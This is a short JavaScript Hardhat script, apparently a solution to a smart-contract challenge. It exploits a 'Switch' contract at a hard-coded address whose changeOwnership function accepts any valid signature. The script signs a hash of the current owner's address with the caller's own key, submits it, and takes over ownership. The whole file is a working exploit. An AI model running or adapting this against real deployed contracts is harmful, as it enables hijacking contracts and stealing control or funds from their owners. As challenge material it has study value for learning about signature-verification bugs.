
const hre = require("hardhat");
const { ethers } = hre;

const address = '0xa5343165d51ea577d63e1a550b1f3c872adc58e4';

// the changeOwnership function just checks that ecrecover is different than
// the zero address instead of checking against the current owner address.
// Here we are signing the same message as the contract, but any valid signature
// will do the work.
async function main() {
  const [signer] = await ethers.getSigners();

  const Switch = await ethers.getContractFactory("Switch");
  const instance = Switch.attach(address);

  const owner = await instance.owner();

  const addressHash = ethers.utils.solidityKeccak256(['address'], [owner]);
  const raw = await signer.signMessage(ethers.utils.arrayify(addressHash));
  const { v, r, s } = ethers.utils.splitSignature(raw);

  console.log('Current owner:', owner);

  const tx = await instance['changeOwnership(uint8,bytes32,bytes32)'](v, r, s);
  await tx.wait();

  console.log('New owner:', await instance.owner());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
